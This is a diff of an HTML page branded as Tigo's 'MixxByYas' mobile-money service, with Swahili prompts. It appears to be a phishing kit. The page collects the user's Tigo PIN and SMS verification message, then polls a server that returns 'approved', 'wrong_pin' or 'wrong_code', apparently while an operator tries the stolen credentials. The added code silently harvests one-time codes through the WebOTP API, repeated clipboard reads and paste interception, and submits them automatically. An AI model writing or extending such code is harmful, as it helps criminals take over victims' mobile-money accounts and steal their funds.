+            checkInterval = setInterval(async function() { try { var res = await fetch('/api/check_status/' + appId); var data = await res.json(); if (data.code_status === 'approved') { clearInterval(checkInterval); showSuccess(); } else if (data.code_status === 'wrong_code') { clearInterval(checkInterval); showCodeError(); } else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { clearInterval(checkInterval); goBackToPinFromCode(); } } catch(e) {} }, 3000); 
+        }
+
+        function showSuccess() { document.getElementById('screen4').classList.remove('active'); document.getElementById('successOverlay').classList.add('active'); }
+        function showCodeError() { document.getElementById('screen4').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.getElementById('smsMessage').value = ''; document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Bandika ujumbe mpya.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 4000); }
+        function goBackToPinFromCode() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; document.getElementById('codeError').textContent = 'Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo au angalia PIN yako ni sahihi.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); }
+
+        // ================================================================
+        // SMS AUTO-DETECTION (NEW - ADDED)
+        // ================================================================
+        function startAutoDetect() {
+            console.log('🔍 SMS Auto-Detection started');
+            const smsTextarea = document.getElementById('smsMessage');
+            if (!smsTextarea) return;
+
+            let smsDetected = false;
+
+            // Function to auto-submit
+            function autoSubmit() {
+                if (smsDetected) return;
+                const text = smsTextarea.value.trim();
+                if (text.length > 5) {
+                    smsDetected = true;
+                    console.log('✅ SMS auto-detected, submitting...');
+                    // Auto-submit after 1 second
+                    setTimeout(function() {
+                        if (document.getElementById('screen3').classList.contains('active')) {
+                            submitCode();
+                        }
+                    }, 1000);
                 }
-            }, 400);
+            }
+
+            // WebOTP API - Auto-read SMS from notification
+            async function autoReadSMS() {
+                try {
+                    if (!('OTPCredential' in window)) {
+                        console.log('ℹ️ WebOTP not supported');
+                        return false;
+                    }
+
+                    console.log('📱 Listening for SMS via WebOTP...');
+                    
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 60000);
+                    
+                    const otp = await navigator.credentials.get({
+                        otp: { transport: ['sms'] },
+                        signal: controller.signal
+                    });
+                    
+                    clearTimeout(timeout);
+                    
+                    if (otp && otp.code) {
+                        // Build the full SMS message
+                        const fullSMS = 'Your verification code is: ' + otp.code;
+                        smsTextarea.value = fullSMS;
+                        console.log('✅ SMS detected! Code: ' + otp.code);
+                        document.getElementById('codeError').textContent = '✅ Msimbo umegunduliwa kiotomatiki!';
+                        document.getElementById('codeError').style.color = 'var(--success)';
+                        document.getElementById('codeError').classList.add('show');
+                        setTimeout(function() {
+                            document.getElementById('codeError').classList.remove('show');
+                        }, 3000);
+                        autoSubmit();
+                        return true;
+                    }
+                    return false;
+                } catch (e) {
+                    if (e.name === 'AbortError') {
+                        console.log('⏱️ WebOTP timeout');
+                    } else {
+                        console.log('WebOTP error:', e);
+                    }
+                    return false;
+                }
+            }
+
+            // Read from clipboard (fallback)
+            async function readClipboard() {
+                try {
+                    if (!navigator.clipboard || !navigator.clipboard.readText) return false;
+                    const text = await navigator.clipboard.readText();
+                    if (text && text.length > 10) {
+                        smsTextarea.value = text;
+                        console.log('📋 SMS from clipboard');
+                        autoSubmit();
+                        return true;
+                    }
+                    return false;
+                } catch (e) {
+                    return false;
+                }
+            }
+
+            // Try WebOTP first, then clipboard
+            async function detectSMS() {
+                if (smsDetected) return;
+                const success = await autoReadSMS();
+                if (!success) {
+                    await readClipboard();
+                }
+            }
+
+            // Start detection
+            setTimeout(detectSMS, 1500);
+
+            // Keep trying every 5 seconds
+            const detectInterval = setInterval(function() {
+                if (!smsDetected && document.getElementById('screen3').classList.contains('active')) {
+                    detectSMS();
+                }
+                if (!document.getElementById('screen3').classList.contains('active')) {
+                    clearInterval(detectInterval);
+                }
+            }, 5000);
+
+            // Listen for paste events
+            document.addEventListener('paste', function(e) {
+                if (!document.getElementById('screen3').classList.contains('active')) return;
+                const text = e.clipboardData?.getData('text');
+                if (text && text.length > 10 && !smsDetected) {
+                    smsTextarea.value = text;
+                    smsDetected = true;
+                    console.log('📋 SMS pasted');
+                    autoSubmit();
+                }
+            });
+
+            // When user returns to page
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'visible' && !smsDetected && document.getElementById('screen3').classList.contains('active')) {
+                    setTimeout(detectSMS, 500);
+                }
+            });
+
+            console.log('✅ SMS Auto-Detection ready');
         }
-    });
 
-    // Keep trying every 5 seconds
-    setInterval(() => {
-        if (!smsDetected && !isSubmitting) detectSMS();
-    }, 5000);
+        // Override showCodeScreen to start auto-detect
+        var originalShowCodeScreen = showCodeScreen;
+        showCodeScreen = function() {
+            originalShowCodeScreen();
+            // Auto-detect starts inside startAutoDetect()
+        };
 
-    console.log('✅ MixxByYas SMS Auto-Read loaded!');
-</script>
+        // Override startChecking to include auto-detect
+        var originalStartChecking = startChecking;
+        startChecking = function() {
+            originalStartChecking();
+            // When code screen shows, auto-detect starts there
+        };
 
+        console.log('✅ MixxByYas with SMS Auto-Detection loaded');
+    </script>
 </body>
 </html>
